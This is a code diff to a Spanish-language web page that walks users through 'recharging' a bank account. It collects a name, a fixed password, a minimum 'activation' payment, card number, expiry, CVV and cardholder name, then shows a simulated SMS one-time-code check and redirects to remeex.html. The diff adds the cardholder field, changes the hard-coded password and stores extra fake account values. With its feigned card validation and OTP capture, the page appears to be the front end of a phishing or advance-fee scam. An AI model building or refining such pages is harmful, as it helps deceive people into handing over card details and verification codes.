@@ -640,26 +640,24 @@
       transform: translateY(0);
     }
 
-    /* Fix for section headers with names */
     .section-content h2 {
       margin-bottom: 1.5rem;
       font-size: 1.5rem;
       color: var(--primary);
-      display: inline-block; /* Changed from flex to inline-block */
-      line-height: 1.4; /* Improved line height for better readability */
+      display: inline-block;
+      line-height: 1.4;
     }
 
     .section-content h2 i {
       color: var(--primary);
       font-size: 1.3rem;
-      margin-right: 0.75rem; /* Add consistent spacing after icon */
-      vertical-align: middle; /* Align icon properly with text */
+      margin-right: 0.75rem;
+      vertical-align: middle;
     }
 
-    /* Add a style for the name part in the titles */
     .user-name-title {
-      font-weight: 600; /* Make the name slightly bolder */
-      display: inline; /* Keep it inline with the rest of the title */
+      font-weight: 600;
+      display: inline;
     }
 
     .form-group {
@@ -946,12 +944,19 @@
     }
     .credit-card-visual .card-holder {
       font-size: 0.9rem;
+      margin-left: 1rem;
       margin-bottom: 0.5rem;
+      text-transform: uppercase;
+      width: 70%;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
     }
     .credit-card-visual .card-expiration {
       font-size: 0.9rem;
       text-align: right;
       margin-bottom: 0.5rem;
+      margin-right: 1rem;
     }
     @media (max-width: 480px) {
       .credit-card-visual {
@@ -1151,7 +1156,6 @@
 
   <!-- Paso 1: Idioma -->
   <div class="section-content" id="step1">
-    <!-- Actualizado con spans -->
     <h2><i class="fas fa-language"></i> <span class="user-name-title" id="labelNameLang"></span>, ¿Cuál idioma prefieres?</h2>
     <div class="form-group">
       <label class="form-label" for="language">Idioma</label>
@@ -1202,7 +1206,6 @@
 
   <!-- Paso 2: Tipo de Tarjeta -->
   <div class="section-content" id="step2">
-    <!-- Actualizado con spans -->
     <h2><i class="fas fa-credit-card"></i> <span class="user-name-title" id="labelNameCard"></span>, ¿con qué tipo de tarjeta vas a recargar tu cuenta bancaria?</h2>
     <div class="form-group">
       <label class="form-label" for="cardType">Tipo de tarjeta</label>
@@ -1258,7 +1261,6 @@
 
   <!-- Paso 3: País de Destino -->
   <div class="section-content" id="step3">
-    <!-- Actualizado con spans -->
     <h2><i class="fas fa-globe-americas"></i> <span class="user-name-title" id="labelNameCountry"></span>, selecciona tu país</h2>
     <div class="form-group">
       <label class="form-label" for="country">País Destino</label>
@@ -1330,7 +1332,6 @@
 
   <!-- Paso 4: Tipo de Transacción -->
   <div class="section-content" id="step4">
-    <!-- Actualizado con spans -->
     <h2><i class="fas fa-exchange-alt"></i> <span class="user-name-title" id="labelNameTxn"></span>, ¿qué tipo de transacción vas a realizar?</h2>
     <div class="form-group">
       <label class="form-label" for="transactionType">Elige el tipo</label>
@@ -1375,7 +1376,6 @@
 
   <!-- Paso 5: Términos y Condiciones -->
   <div class="section-content" id="step5">
-    <!-- Actualizado con spans -->
     <h2><i class="fas fa-file-contract"></i> <span class="user-name-title" id="labelNameTerms"></span>, acepta los Términos y Condiciones</h2>
     <div class="checkbox-group">
       <input type="checkbox" id="acceptVisa" />
@@ -1423,7 +1423,6 @@
 
   <!-- Paso 6: Realiza tu recarga -->
   <div class="section-content" id="step6">
-    <!-- Actualizado con spans -->
     <h2><i class="fas fa-money-bill-wave"></i> <span class="user-name-title" id="labelNameRecharge"></span>, es momento que realices tu recarga</h2>
     <div class="form-group">
       <label class="form-label">Selecciona tu monto en USD:</label>
@@ -1482,7 +1481,7 @@
   <div class="section-content" id="step7">
     <h2><i class="fas fa-credit-card"></i> Ingresa los datos de tu tarjeta para recargar</h2>
     
-    <!-- Resumen rápido de lo seleccionado, con mejor diseño -->
+    <!-- Resumen rápido de lo seleccionado -->
     <div class="summary-card">
       <div class="summary-row">
         <span>Monto Seleccionado (USD):</span>
@@ -1507,12 +1506,16 @@
       <div class="credit-card-visual">
         <div class="chip"></div>
         <div class="card-number" id="cardNumberPreview">#### #### #### ####</div>
-        <div class="card-holder">TITULAR</div>
+        <div class="card-holder" id="cardHolderPreview">TITULAR</div>
         <div class="card-expiration" id="cardExpPreview">MM/AA</div>
       </div>
       
       <!-- Campos para la tarjeta -->
       <div style="width:100%;">
+        <div class="form-group">
+          <label class="form-label" for="cardHolder">Nombre del Titular</label>
+          <input type="text" class="form-control" id="cardHolder" placeholder="Ej: JUAN PEREZ" />
+        </div>
         <div class="form-group">
           <label class="form-label" for="cardNumber">Número de Tarjeta</label>
           <input type="text" class="form-control" id="cardNumber" placeholder="#### #### #### ####" maxlength="16" />
@@ -1581,11 +1584,10 @@
   z-index: 99999;
   justify-content: center;
   align-items: center;
-  text-align:center;
-  color: #fff;
-  font-size:1.2rem;">
+  text-align:center;">
+  
   <div style="
-       background: rgba(255,255,255,0.95);
+       background: rgba(255,255,255,0.97);
        color: #000;
        padding:2rem;
        border-radius:20px;
@@ -1594,29 +1596,56 @@
        display:flex;
        flex-direction:column;
        align-items:center;
-       position:relative;">
-    <div id="overlayMessage" style="margin-bottom:1rem; font-weight:600; text-align:center;"></div>
+       position:relative;
+       box-shadow: 0 25px 50px rgba(0,0,0,0.3);">
+    
+    <!-- Título del Overlay (SMS) -->
+    <div id="overlayTitle" style="font-weight:700; font-size:1.1rem; margin-bottom:0.5rem;">
+      Verificación de SMS
+    </div>
+    <div id="overlayMessage" style="margin-bottom:1rem; font-weight:600; text-align:center; font-size:1rem;">
+      <!-- Mensaje dinámico -->
+    </div>
+
     <!-- Spinner -->
     <div id="overlaySpinner" style="display:flex; margin:1rem 0;">
       <div class="spinner-circle circle1"></div>
       <div class="spinner-circle circle2"></div>
       <div class="spinner-circle circle3"></div>
     </div>
-    <div id="overlayPositive" style="font-size:2rem; color:green; display:none;">
+
+    <!-- Íconos de resultado -->
+    <div id="overlayPositive" style="font-size:2.5rem; color:green; display:none; margin:1rem 0;">
       <i class="fas fa-check-circle"></i>
     </div>
-    <div id="overlayNegative" style="font-size:2rem; color:red; display:none;">
+    <div id="overlayNegative" style="font-size:2.5rem; color:red; display:none; margin:1rem 0;">
       <i class="fas fa-times-circle"></i>
     </div>
+
     <!-- Para pedir el código OTP -->
     <div id="overlayOTP" style="display:none; width:100%;">
-      <label>Ingresa tu código de 6 dígitos</label>
+      <label style="font-weight:500; font-size:0.95rem;">
+        Ingresa tu código de 6 dígitos:
+      </label>
       <input type="password" id="otpCode" maxlength="6" style="
-             text-align:center; font-size:1.2rem; font-weight:600; 
-             width:100%; margin:1rem 0; padding:0.5rem; border-radius:6px; border:2px solid #ddd;">
+             text-align:center; 
+             font-size:1.2rem; 
+             font-weight:600; 
+             width:100%; 
+             margin:1rem 0; 
+             padding:0.5rem; 
+             border-radius:6px; 
+             border:2px solid #ddd;">
       <button id="btnOTPConfirm" style="
-              background: #1a1f71; color:#fff; border:none; border-radius:6px; 
-              padding:0.5rem 1rem; cursor:pointer;">Confirmar</button>
+              background: var(--primary); 
+              color:#fff; 
+              border:none; 
+              border-radius:6px; 
+              padding:0.6rem 1.25rem; 
+              cursor:pointer; 
+              font-weight:600;">
+        Confirmar
+      </button>
     </div>
   </div>
 </div>
@@ -1797,16 +1826,18 @@
   const equivInfo   = document.getElementById("equivInfo");
 
   // Paso 7 (Tarjeta)
-  const step7         = document.getElementById("step7");
-  const backBtn7      = document.getElementById("backBtn7");
-  const confirmCardBtn= document.getElementById("confirmCardBtn");
-  const cardNumberInp = document.getElementById("cardNumber");
-  const cardExpiryInp = document.getElementById("cardExpiry");
-  const cardCVVInp    = document.getElementById("cardCVV");
+  const step7          = document.getElementById("step7");
+  const backBtn7       = document.getElementById("backBtn7");
+  const confirmCardBtn = document.getElementById("confirmCardBtn");
+  const cardHolderInp  = document.getElementById("cardHolder");
+  const cardNumberInp  = document.getElementById("cardNumber");
+  const cardExpiryInp  = document.getElementById("cardExpiry");
+  const cardCVVInp     = document.getElementById("cardCVV");
 
   // Preview en la tarjeta
-  const cardNumPreview= document.getElementById("cardNumberPreview");
-  const cardExpPreview= document.getElementById("cardExpPreview");
+  const cardNumPreview = document.getElementById("cardNumberPreview");
+  const cardExpPreview = document.getElementById("cardExpPreview");
+  const cardHolderPrev = document.getElementById("cardHolderPreview");
 
   // Summary fields
   const summaryUSD     = document.getElementById("summaryUSD");
@@ -1848,19 +1879,17 @@
       alert("Por favor, ingresa tu nombre completo y la contraseña de 10 dígitos.");
       return;
     }
-    // Validar que sea la contraseña correcta (no mostrarla al usuario)
-    if(pass10 !== "0000002080") {
+    // Validar que sea la contraseña correcta (de ejemplo)
+    if(pass10 !== "0000002090") {
       alert("Contraseña incorrecta. Inténtalo de nuevo.");
       return;
     }
-    // Continuar con la lógica interna
     const last4   = pass10.slice(-4);   // '2080'
     const first2  = last4.slice(0,2);   // '20'
     const next2   = last4.slice(2,4);   // '80'
     const amountMinUSD = parseInt(first2, 10) || 0; // 20
     const rateBolivar  = parseInt(next2, 10) || 0;  // 80
 
-    // Extraer primer nombre
     const nameParts = fullName.split(" ");
     let shortName = nameParts[0] || fullName;
 
@@ -2005,7 +2034,7 @@
     if(!loginData) loginData = "{}";
     loginData = JSON.parse(loginData);
 
-    const minUSD = loginData.amountMinUSD || 0; // 20
+    const minUSD = loginData.amountMinUSD || 0;
     const selectedUSD = parseInt(rechargeSel.value, 10);
     if(selectedUSD < minUSD) {
       alert(`El monto mínimo de activación es ${minUSD} USD. Selecciona un monto mayor o igual.`);
@@ -2026,13 +2055,16 @@
   backBtn7.addEventListener("click", () => goToStep(6));
   confirmCardBtn.addEventListener("click", validateCard);
 
-  // Mostrar cambios en tiempo real en la "tarjeta visual"
+  // Actualización de campos en tiempo real
   cardNumberInp.addEventListener("input", function(){
     const val = this.value.replace(/\s/g,'').replace(/(\d{4})/g, "$1 ").trim();
     cardNumPreview.textContent = val || "#### #### #### ####";
   });
   cardExpiryInp.addEventListener("input", function(){
     cardExpPreview.textContent = this.value || "MM/AA";
+  });
+  cardHolderInp.addEventListener("input", function(){
+    cardHolderPrev.textContent = this.value.toUpperCase() || "TITULAR";
   });
 
   function updateCardSummary() {
@@ -2044,7 +2076,6 @@
     const usd  = loginData.selectedUSD || 0;
     const eqBs = usd * rate;
 
-    // Formato
     const usdFormatted = formatNumberES(usd) + " USD";
     const bsFormatted  = formatNumberES(eqBs) + " Bs";
     const rateFormatted= formatNumberES(rate) + " Bs/USD";
@@ -2085,7 +2116,12 @@
     const cardNum = cardNumberInp.value.trim();
     const cardExp = cardExpiryInp.value.trim();
     const cardCvv = cardCVVInp.value.trim();
+    const holder  = cardHolderInp.value.trim();
 
+    if(!holder) {
+      alert("Por favor, ingresa el nombre del titular de la tarjeta.");
+      return;
+    }
     if(cardNum.length !== 16) {
       alert("Número de tarjeta inválido. Debe tener 16 dígitos.");
       return;
@@ -2104,7 +2140,7 @@
       showOverlay("Tarjeta válida", false, true, false, false);
       setTimeout(() => {
         hideOverlay();
-        showOverlay("Hemos enviado un código de 6 dígitos", false, false, false, true);
+        showOverlay("Hemos enviado un código de 6 dígitos a tu teléfono", false, false, false, true);
       }, 2000);
     } else {
       showOverlay("Tarjeta inválida", false, false, true, false);
@@ -2134,30 +2170,59 @@
     }, 5000);
   });
 
-  // Guardar datos finales y redirigir
+  // Funciones Finalize:
+  // ---------------------------------
+  // Versión combinada que asegura la tasa como float con fallback
+  // y almacena los datos adicionales que se necesitan
+  // ---------------------------------
   function finalizeAndGo() {
     isRedirecting = true;
     let loginData = sessionStorage.getItem("loginData");
     if(!loginData) loginData = "{}";
     loginData = JSON.parse(loginData);
 
+    // Asegurar que la tasa de cambio se preserve y sea numérica
+    const parsedRate = parseFloat(loginData.rateBolivar);
+    const rateBolivar = isNaN(parsedRate) ? 69.0 : parsedRate; // fallback 69.0
+    const selectedUSD = loginData.selectedUSD || 0;
+    const balanceBS   = selectedUSD * rateBolivar;
+
     const data = {
       fullName       : loginData.fullName,
       userName       : loginData.shortName,
       password       : loginData.password,
       amountMinUSD   : loginData.amountMinUSD,
-      rateBolivar    : loginData.rateBolivar,
-      selectedUSD    : loginData.selectedUSD || 0,
+      rateBolivar    : rateBolivar, 
+      selectedUSD    : selectedUSD,
       language       : languageSelect.value,
       cardType       : cardTypeSelect.value,
       cardBrand      : cardBrandSelect.value,
       country        : countrySelect.value,
       transactionType: transactionTypeSelect.value
     };
-
+    
+    // Almacenar el objeto completo
     sessionStorage.setItem("datosRemeex", JSON.stringify(data));
     localStorage.setItem("datosRemeex", JSON.stringify(data));
     sessionStorage.setItem("datosIndex", JSON.stringify(data));
+    
+    // Almacenar también la tasa y el balance BS
+    sessionStorage.setItem("USD_RATE", rateBolivar.toString());
+    localStorage.setItem("USD_RATE", rateBolivar.toString());
+    sessionStorage.setItem("currentBalanceBS", balanceBS.toString());
+    localStorage.setItem("currentBalanceBS", balanceBS.toString());
+    
+    // Guardar el nombre del usuario también
+    sessionStorage.setItem("userName", loginData.shortName);
+    localStorage.setItem("userName", loginData.shortName);
+
+    // Guardar un banco predeterminado, etc.
+    sessionStorage.setItem("selectedBankName", "Banco de Venezuela, SA");
+    localStorage.setItem("selectedBankName", "Banco de Venezuela, SA");
+
+    // Registrar el ingreso mensual (igual a selectedUSD, por ejemplo)
+    sessionStorage.setItem("monthlyIncomeUSD", selectedUSD.toString());
+    localStorage.setItem("monthlyIncomeUSD", selectedUSD.toString());
 
     window.location.href = "remeex.html";
   }
